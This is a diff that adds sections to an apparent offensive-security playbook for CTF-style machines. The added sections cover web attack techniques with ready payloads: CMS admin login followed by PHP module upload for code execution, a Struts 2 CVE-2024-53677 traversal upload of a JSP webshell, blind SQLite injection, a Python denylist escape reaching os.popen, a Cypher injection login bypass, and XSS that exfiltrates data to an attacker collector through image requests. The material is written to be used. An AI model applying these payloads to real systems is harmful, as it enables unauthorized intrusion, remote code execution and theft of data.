@@ -229,6 +229,26 @@ every POST; (2) once its config points at your *remote* DB, every page round-tri
 queries across the VPN — fire requests serially, or concurrency exhausts the
 target's workers and wedges it.
 
+**A CMS login/form that silently re-renders — no error, no session — is a stale
+cached form token, not a wrong password.** Drupal and its forks (Backdrop) cache
+anonymous pages, so the login page is served from cache with a `form_build_id`
+that no longer exists in the server's form cache; a POST using it is dropped and
+the form re-renders with *no* "unrecognized username/password" message — which
+reads exactly like bad credentials and sends you to re-spray. Two fixes, both
+required: (1) **bust the page cache** on the GET that fetches the form
+(`&cb=$RANDOM`, or any unique query) so you get a live `form_build_id`; (2) **use
+the exact `form_id` the fresh HTML carries**, not the one you assume — Backdrop's
+login form id is `user_login`, not `user_login_form`. Confirm success by the
+`302` + `Set-Cookie: SESS...`, never by the absence of an error. The general rule:
+when a form POST produces neither success nor a validation error, suspect a
+token/cache mismatch and re-pull the form uncached before doubting the creds.
+Once in as admin, the module/theme installer is the RCE (see the upload-pivot
+note above): upload a minimal module archive (a `.info` descriptor + a one-line
+PHP `system()` file, `tar.gz`) via the manual installer; the install batch runs
+through `core/authorize.php` as an AJAX batch, so drive `authorize.php?...&op=do_nojs`
+to completion, and note the extracted file is served even when the batch reports
+an enable error.
+
 **Local file inclusion** — any parameter taking a path or template name.
 ```
 ?page=../../../../etc/passwd
@@ -327,6 +347,23 @@ magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
 `.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
 Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).
 
+**Separate two independent questions: what the filter validates (the bytes) and
+where the handler writes (the path).** A content filter can be airtight while the
+*destination* is attacker-controlled through a settable property the framework
+binds from request params. If the code is `copyFile(upload, new File(dir,
+fileNameProperty))` and `fileNameProperty` has a public setter, override it with
+a traversal to escape the intended directory and drop an executable file in the
+web root — the image/MIME/magic-byte guards still pass because the bytes are a
+real (polyglot) image. The class is "framework binds a filename/path param you
+can also set directly"; the worked example is Struts 2 **CVE-2024-53677 /
+S2-067** (6.0.0–6.3.0.2): send the file part as `Upload` plus a second field
+`top.UploadFileName=../../shell.jsp`, body = `GIF89a`-prefixed JSP webshell,
+content-type `image/gif`. When source is available (a `/download.action` or any
+endpoint that ships the build context), read the upload handler to confirm the
+sink and the exact property name rather than guessing. Pin the framework version
+first and check its CVEs — this whole class is invisible from the upload form
+alone.
+
 **An upload that a person/bot then *opens* is a client-side NTLM coercion, not
 a code-exec bug — the file never has to run.** When the app says a human or an
 automated "reviewer" will *view/open/convert* your upload (an HR review, a
@@ -391,6 +428,18 @@ pwnloop x "sqlmap -u 'http://machine.htb/x.php?id=1' --batch --dbs"
 pwnloop x "sqlmap -u '...' --batch -D db -T users --dump"
 pwnloop x "sqlmap -u '...' --batch --os-shell"     # when FILE privilege exists
 ```
+When the sink is **second-order / admin-gated and reflects nothing** (a value you
+POST is concatenated into an `INSERT` whose result is never shown), `sqlmap`
+usually can't drive it — hand-roll a boolean oracle on whatever observable the
+app leaks, most often **HTTP 200 vs 500** (a valid statement succeeds; a broken
+one throws an uncaught DB exception). The one trap that silently wastes an hour:
+the false-branch must error at **runtime, not parse time**, or it fires on *both*
+branches and the oracle is stuck-on. On SQLite the reliable runtime error is
+`load_extension(1)` (a missing-table reference parses on both branches; integer
+overflow quietly promotes to float and never errors):
+`x'||(SELECT CASE WHEN (<cond>) THEN 7 ELSE load_extension(1) END)||'` → true=200,
+false=500. Binary-search `unicode(substr(...,i,1))` to pull each row. The class:
+pick an error primitive whose cost is paid only when the condition is false.
 
 **SSTI** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. A rendered `49` means
 RCE is usually one payload away (Jinja2, Twig, Freemarker, Velocity).
@@ -745,6 +794,23 @@ Keep the per-library escape payload in `local.md`; the transferable rule is
 **"an interpreter embedded in the app process is not a sandbox — pin its version,
 find the published escape, and the return value is your output oracle."**
 
+**The hand-rolled variant: a denylist over the submitted *source text*.** When the
+app has no sandbox library at all but filters the code string before `exec()` —
+`for kw in [...]: if kw in code.lower(): reject` — you need no CVE, only to emit a
+payload in which none of the banned tokens appears *as source*. Two moves compose:
+(1) build every sensitive string at runtime so the literal never shows up —
+`chr(111)+chr(115)` is `"os"` at runtime but the source has no `os`; implicit
+concatenation (`'o' 's'`) works only if the join itself spells nothing banned, so
+`chr()` is the safe default. (2) Reach `os`/builtins through the pure-stdlib object
+graph rather than `import`: `().__class__.__base__.__subclasses__()`, find
+`catch_warnings`, then `cw.__init__.__globals__[BI][IMP]('os')` where `BI`/`IMP`
+are the `chr()`-built strings `"__builtins__"`/`"__import__"`. Then
+`os.popen(cmd).read()` returns output in the same response. First *map the filter*
+empirically (submit `print("X")#<word>` per candidate — a block vs an `X` tells you
+each banned substring) so your payload is minimal and you learn whether the check is
+substring or word-bounded. The denylist is the vuln; name process isolation as the
+fix. *(code.htb: unauth `/run_code`, substring denylist incl. `__builtins__`.)*
+
 ## An arbitrary-file-read runs as the app user — read the app user's own secrets
 
 When a web bug gives file read (LFI, path traversal, an S3/uploader traversal like
@@ -957,6 +1023,36 @@ the exact slashing, deliver via the published exploit's own encoding (the bypass
 variant — e.g. CVE-2024-8353 for GiveWP — or the Metasploit module handles it) and
 use it only to drop a webshell; then work from the shell.
 
+## Cypher / Neo4j injection — error reflection + UNION auth bypass
+
+A graph app whose login or search concatenates input into a Cypher query. A
+single quote in the field returns `Neo.ClientError.Statement.SyntaxError` — and
+these apps routinely reflect the **whole query** in the error, handing you the
+exact structure for free. The common login shape:
+
+```
+MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '<username>' return h.value as hash
+```
+
+i.e. it fetches the stored password hash and the app compares `SHA1(password)`
+to it. You do not need anyone's real hash — make the query **return a hash of a
+password you choose**. The gotcha: a bare `RETURN` gated by a `MATCH` that
+matches nothing yields zero rows, so inject a `UNION` whose second part is a
+*MATCH-less* `RETURN` (always one row), and comment out the trailing clause:
+
+```
+username = x' RETURN h.value as hash UNION RETURN '<sha1(test)>' as hash //
+password = test
+```
+
+→ valid session (here a JWT `access-token` cookie) for an account you can't
+authenticate to normally. Then hunt for an authenticated **raw query endpoint**
+(`/api/cypher?query=`): these apps expose one for the graph view, and it runs
+arbitrary Cypher → enumerate custom procedures and pivot to RCE (see the Neo4j
+section in `services.md`). Fixes the app ignored: parameterised queries
+(`$username`) and not reflecting DB errors. Column names must match across a
+`UNION`; `//` is a Cypher line comment.
+
 ## A "URL checker"/SSRF that shells out to `curl` is argument injection, not just SSRF
 
 When a feature fetches a user-supplied URL and the backend builds a *shell* command
@@ -1018,3 +1114,23 @@ An `<img src=x onerror=…>` fires regardless of how the HTML was inserted, unli
 an injected `<script>`. The result (new creds, a planted file) is something you
 then reach directly — no inbound connection required. See the egress-direction
 rule in the skill's enumeration section.
+
+Three failure modes that read as "the XSS didn't work" when it did:
+- **CSP splits your read channel from your exfil channel.** A `connect-src 'self'`
+  policy lets `fetch()` read *same-origin* pages fine but silently blocks `fetch`
+  to your collector — and the rejection is a generic `TypeError: NetworkError`
+  that looks identical to a dead payload. `img-src` is almost always looser, so
+  exfiltrate with `new Image().src='http://you/?b='+encodeURIComponent(x)`, never
+  a `fetch` to your box. Read with `fetch` (same-origin), send with `<img>`.
+- **A review/preview bot visits each resource once and may delete it afterwards.**
+  Re-pointing the *same* repo/ticket/URL at a new payload gets silently skipped
+  (already reviewed, or gone). Create a **fresh resource per iteration** — a new
+  repo name each time — or you'll conclude the technique failed when the bot just
+  deduped. Confirm the bot ran at all with a no-op beacon (`/?t=start`) at the top
+  of the payload.
+- **The bot often runs off-host:** it can reach *your* VPN IP but not the app's
+  `127.0.0.1:<port>`, so build the payload around the page's *own* origin
+  (relative/same-origin fetches), not `localhost`. A privileged reviewer session
+  (e.g. a Gitea **admin** bot on a 1.22.0 `javascript:`-description XSS,
+  CVE-2024-6886) then reads private repos/pages *for* you — the win is the data
+  it returns, not its cookie (which is usually `HttpOnly`).
